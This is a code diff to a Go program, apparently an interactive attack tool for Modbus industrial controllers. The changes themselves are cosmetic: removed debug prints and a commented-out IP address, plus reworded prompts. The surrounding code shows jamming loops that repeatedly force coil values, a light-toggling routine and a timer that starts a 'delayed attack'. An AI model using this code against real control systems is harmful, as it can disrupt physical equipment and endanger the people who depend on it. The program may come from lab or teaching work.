@@ -17,7 +17,6 @@ func modbusConnection(ip_address string, port string) modbus.Client {
 
 	err := handler.Connect()
 	if err != nil {
-		fmt.Print("I AM IN CONNECTION")
 		fmt.Print(err)
 	}
 
@@ -32,7 +31,7 @@ func timeDelay(timeMin int, ip_address string, port string, jamming int, runtime
 	timer2 := time.NewTimer(time.Duration(timeMin) * time.Minute)
 	go func() {
 		<-timer2.C
-		fmt.Println("Begining delayed attack...")
+		fmt.Println("Begining delayed attack")
 		go denial(ip_address, port, jamming, runtime, coil, coil_val)
 	}()
 }
@@ -41,19 +40,16 @@ func jammer(target modbus.Client, coil uint16, coil_value int, stopChannel chan 
 	for {
 		select {
 		case <-stopChannel:
-			//fmt.Print("Finished")
 			return
 		default:
 			if coil_value == 1 {
 				results, err := target.WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
-				//fmt.Println("Thread still running")
 				if err != nil {
 					fmt.Println(err)
 					fmt.Println(results)
 				}
 			} else {
 				results, err := target.WriteSingleCoil(coil, 0x0000)
-				//fmt.Println("Thread still running")
 				if err != nil {
 					fmt.Println(err)
 					fmt.Println(results)
@@ -89,7 +85,7 @@ func toggle(ip_address string, port string, coil uint16, coil_value int, cycle b
 		go func() {
 			<-timer2.C
 			fmt.Println("Ending toggle")
-			isBreak = true
+			isBreak = true //Breaks the light flashing
 		}()
 		for {
 			results, err := modbusConnection(ip_address, port).WriteSingleCoil(coil, 0xFF00)
@@ -158,12 +154,11 @@ func main() {
 			fmt.Scanln(&coil_value)
 
 			go denial(ip_address, port, jamming, runtime, coil, coil_value)
-			//go denial("192.168.13.86", 500, 1, 0, 0)
 		} else if userSelection == 2 {
 			var timeCycle int
 			var cycleDelay int
 			var cycle bool
-			fmt.Println("If repeated toggle enter 1, if signle toggle enter 0")
+			fmt.Println("To cycle light enter 1, to toggle light enter 0")
 			fmt.Scanln(&cycle)
 
 			if cycle {
@@ -221,7 +216,7 @@ func main() {
 			fmt.Scanln(&coil_value)
 
 			var timeMin int
-			fmt.Println("Enter how many minutes you want to delay your attack before occuring:")
+			fmt.Println("Enter how many minutes wait before starting attack:")
 			fmt.Scanln(&timeMin)
 
 			go timeDelay(timeMin, ip_address, port, jamming, runtime, coil, coil_value)
